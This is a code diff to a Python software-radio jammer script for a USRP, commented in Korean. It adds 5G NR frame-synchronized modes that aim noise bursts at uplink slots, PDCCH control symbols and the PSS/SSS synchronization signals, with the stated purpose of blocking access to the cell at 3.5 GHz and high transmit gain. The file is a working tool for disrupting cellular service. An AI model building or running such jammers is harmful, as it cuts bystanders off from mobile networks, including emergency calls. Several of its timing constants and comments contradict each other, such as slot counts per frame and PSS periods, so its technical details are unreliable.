@@ -31,10 +31,10 @@ MODES = {
 MODE_DESC = {
     "constant":  "지속 고출력 AWGN — 채널 완전 포화",
     "random":    "랜덤 펄스 재밍 — 0.01~0.1s 간격 불규칙 송신",
-    "reactive":  "TDD 슬롯 모방 펄스 — 5ms 주기 (Simplified)",
+    "reactive":  "TDD 슬롯 모방 펄스 — 5G NR 프레임 타이밍 동기 (NR mode) / 5ms 주기 (legacy)",
     "deceptive": "OFDM 위장 재밍 — 합법 신호처럼 보이는 간섭",
-    "pss":       "PSS/SSS 타겟 — 중앙 6-12 RB에 집중, 셀 접속 차단",
-    "pdcch":     "PDCCH 타겟 — 슬롯 첫 1-3 심볼 CORESET 공격",
+    "pss":       "PSS/SSS 타겟 — 중앙 6-12 RB에 집중, 셀 접속 차단 (20ms 프레임 경계)",
+    "pdcch":     "PDCCH 타겟 — 슬롯 첫 1-3 심볼 CORESET 공격 (NR 슬롯 정렬)",
     "dmrs":      "DMRS 타겟 — 빗살 패턴 파일럿 재밍, 채널 추정 교란",
 }
 
@@ -44,14 +44,25 @@ def select_mode_interactive():
         print(f"  {key}) {name:<12} — {MODE_DESC[name]}")
     choice = input("\n모드 번호 또는 이름 입력: ").strip().lower()
 
-    # 번호 입력
     if choice in MODES:
         return MODES[choice]
-    # 이름 직접 입력
     if choice in MODE_DESC:
         return choice
     print(f"[ERROR] 알 수 없는 입력: '{choice}'. constant 모드로 시작합니다.")
     return "constant"
+
+# ─────────────────────────────────────────────
+# 5G NR 타이밍 상수 (μ=1, SCS=30kHz)
+# ─────────────────────────────────────────────
+RATE               = 20e6
+SAMPLES_PER_FRAME  = int(RATE * 0.010)   # 200,000 samples = 10ms radio frame
+SAMPLES_PER_SLOT   = int(RATE * 0.0005)  # 10,000 samples = 0.5ms slot
+SAMPLES_PER_SYMBOL = SAMPLES_PER_SLOT // 14  # ~714 samples per OFDM symbol
+
+# TDD 패턴: DDDDDDDDDDDSUU (14 slots per frame, μ=1)
+# Slot 0-10: DL, Slot 11: Special, Slot 12-13: UL
+NR_UL_SLOTS = [12, 13]
+NR_DL_SLOTS = list(range(12))
 
 # ─────────────────────────────────────────────
 # 신호 생성 헬퍼
@@ -95,10 +106,69 @@ def dmrs_jamming_symbol(comb_spacing=6):
     freq_domain[offset::comb_spacing] = awgn(N_FFT // comb_spacing) * 5.0
     return np.fft.ifft(freq_domain).astype(np.complex64)
 
+
+# ─────────────────────────────────────────────
+# NR-Timing 기반 재밍 프레임 빌더
+# ─────────────────────────────────────────────
+def build_nr_reactive_frame(gain: float = 1.0) -> np.ndarray:
+    """
+    5G NR TDD 프레임(10ms) 버퍼를 빌드.
+    UL 슬롯(12, 13)에만 재밍 신호를 채우고 나머지는 0.
+    → gNB가 PUSCH를 수신하는 구간을 정확히 타겟.
+    """
+    frame = np.zeros(SAMPLES_PER_FRAME, dtype=np.complex64)
+    for slot_idx in NR_UL_SLOTS:
+        start = slot_idx * SAMPLES_PER_SLOT
+        end   = start + SAMPLES_PER_SLOT
+        frame[start:end] = awgn(SAMPLES_PER_SLOT) * gain * 3.0
+    return frame
+
+
+def build_nr_pdcch_frame(n_coreset_symbols: int, gain: float = 1.0) -> np.ndarray:
+    """
+    모든 슬롯의 첫 n_coreset_symbols 심볼에만 광대역 버스트.
+    나머지는 0. → CORESET 구간 정밀 타겟.
+    """
+    frame = np.zeros(SAMPLES_PER_FRAME, dtype=np.complex64)
+    burst_len = SAMPLES_PER_SYMBOL * n_coreset_symbols
+
+    for slot_idx in range(SAMPLES_PER_FRAME // SAMPLES_PER_SLOT):
+        slot_start = slot_idx * SAMPLES_PER_SLOT
+        burst_end  = min(slot_start + burst_len, slot_start + SAMPLES_PER_SLOT)
+        actual_len = burst_end - slot_start
+        if actual_len > 0:
+            burst_frames = []
+            for _ in range(n_coreset_symbols):
+                burst_frames.append(
+                    np.fft.ifft(awgn(N_FFT)).astype(np.complex64) * gain * 4.0
+                )
+            burst = np.concatenate(burst_frames)[:actual_len]
+            frame[slot_start:burst_end] = burst
+    return frame
+
+
+def build_nr_pss_frame(gain: float = 1.0) -> np.ndarray:
+    """
+    PSS/SSS는 매 5ms 서브프레임 경계(슬롯 0, 슬롯 10)에 전송.
+    → 두 위치에 PSS-like 심볼 블록 삽입.
+    """
+    frame = np.zeros(SAMPLES_PER_FRAME, dtype=np.complex64)
+    pss_slots = [0, 10]  # 첫 5ms, 두 번째 5ms 서브프레임 시작
+    pss_symbol = np.tile(pss_jamming_symbol(), int(np.ceil(SAMPLES_PER_SLOT / N_FFT)))
+    pss_symbol = pss_symbol[:SAMPLES_PER_SLOT] * gain
+
+    for slot_idx in pss_slots:
+        start = slot_idx * SAMPLES_PER_SLOT
+        end   = start + SAMPLES_PER_SLOT
+        frame[start:end] = pss_symbol
+    return frame
+
+
 # ─────────────────────────────────────────────
 # 메인 재머
 # ─────────────────────────────────────────────
-def run_jammer(addr, mode="constant", freq=3.5e9, rate=20e6, gain=75):
+def run_jammer(addr, mode="constant", freq=3.5e9, rate=20e6, gain=75,
+               nr_timing=True):
     print(f"[Jammer] USRP 연결 중: addr={addr}")
     usrp = uhd.usrp.MultiUSRP(f"addr={addr}")
     usrp.set_tx_rate(rate)
@@ -107,6 +177,9 @@ def run_jammer(addr, mode="constant", freq=3.5e9, rate=20e6, gain=75):
     usrp.set_tx_antenna("TX/RX", 0)
     print(f"[Jammer] 초기화 완료 — rate={rate/1e6:.0f} MHz, freq={freq/1e9:.1f} GHz, "
           f"gain={gain} dB, ant=TX/RX")
+    if nr_timing and mode in ("reactive", "pdcch", "pss"):
+        print(f"[Jammer] 5G NR 타이밍 모드 활성화 "
+              f"(SAMPLES_PER_FRAME={SAMPLES_PER_FRAME}, SLOT={SAMPLES_PER_SLOT})")
 
     streamer = usrp.get_tx_stream(uhd.usrp.StreamArgs("fc32", "sc16"))
     metadata = uhd.types.TXMetadata()
@@ -127,26 +200,47 @@ def run_jammer(addr, mode="constant", freq=3.5e9, rate=20e6, gain=75):
                 time.sleep(np.random.uniform(0.01, 0.1))
 
             elif mode == "reactive":
-                streamer.send(awgn(2000), metadata)
-                time.sleep(0.005)
+                if nr_timing:
+                    # 5G NR 프레임 타이밍: UL 슬롯 정확히 타겟
+                    frame = build_nr_reactive_frame(gain=1.0)
+                    streamer.send(frame, metadata)
+                    # 다음 프레임 경계까지 대기 (10ms)
+                    time.sleep(0.010)
+                else:
+                    # Legacy: 5ms 주기 단순 펄스
+                    streamer.send(awgn(2000), metadata)
+                    time.sleep(0.005)
 
             elif mode == "deceptive":
                 streamer.send(ofdm_like(), metadata)
                 time.sleep(0.001)
 
             elif mode == "pss":
-                # PSS/SSS: 20ms 라디오 프레임 주기로 중앙 대역 재밍
-                streamer.send(np.tile(pss_jamming_symbol(), 5), metadata)
-                time.sleep(0.020)
+                if nr_timing:
+                    # PSS: 10ms 프레임 경계마다 PSS 위치에 재밍
+                    frame = build_nr_pss_frame(gain=1.0)
+                    streamer.send(frame, metadata)
+                    time.sleep(0.020)  # 2 radio frames (PSS period)
+                else:
+                    # Legacy: 20ms 주기 PSS-like 버스트
+                    streamer.send(np.tile(pss_jamming_symbol(), 5), metadata)
+                    time.sleep(0.020)
 
             elif mode == "pdcch":
-                # PDCCH: 0.5ms 슬롯마다 첫 1-3 심볼 광대역 버스트
-                n_sym = np.random.randint(1, 4)
-                streamer.send(pdcch_jamming_burst(n_sym), metadata)
-                time.sleep(0.0005)
+                if nr_timing:
+                    # PDCCH: 슬롯별 CORESET 심볼 정밀 타겟
+                    n_sym = np.random.randint(1, 4)
+                    frame = build_nr_pdcch_frame(n_sym, gain=1.0)
+                    streamer.send(frame, metadata)
+                    time.sleep(0.010)  # 1 radio frame
+                else:
+                    # Legacy: 0.5ms 슬롯마다 첫 심볼 버스트
+                    n_sym = np.random.randint(1, 4)
+                    streamer.send(pdcch_jamming_burst(n_sym), metadata)
+                    time.sleep(0.0005)
 
             elif mode == "dmrs":
-                # DMRS: 빗살 패턴 연속 송신
+                # DMRS: 빗살 패턴 연속 송신 (NR 타이밍 불필요 — 심볼 내 패턴)
                 spacing = np.random.choice([4, 6])
                 streamer.send(np.tile(dmrs_jamming_symbol(spacing), 5), metadata)
                 time.sleep(0.001)
@@ -171,10 +265,15 @@ if __name__ == "__main__":
     parser.add_argument("--freq", type=float, default=3.5e9, help="TX 주파수 Hz (기본: 3.5e9)")
     parser.add_argument("--rate", type=float, default=20e6,  help="샘플 레이트 Hz (기본: 20e6)")
     parser.add_argument("--gain", type=int,   default=75,    help="TX 게인 dB (기본: 75)")
+    parser.add_argument("--nr-timing",    dest="nr_timing", action="store_true",  default=True,
+                        help="5G NR 프레임 타이밍 기반 송신 (기본: 활성화)")
+    parser.add_argument("--no-nr-timing", dest="nr_timing", action="store_false",
+                        help="NR 타이밍 비활성화 — legacy sleep 방식")
     args = parser.parse_args()
 
     addr = load_jammer_addr()
     print(f"[Config] Jammer USRP addr = {addr}")
 
     mode = args.mode if args.mode else select_mode_interactive()
-    run_jammer(addr, mode=mode, freq=args.freq, rate=args.rate, gain=args.gain)
+    run_jammer(addr, mode=mode, freq=args.freq, rate=args.rate, gain=args.gain,
+               nr_timing=args.nr_timing)
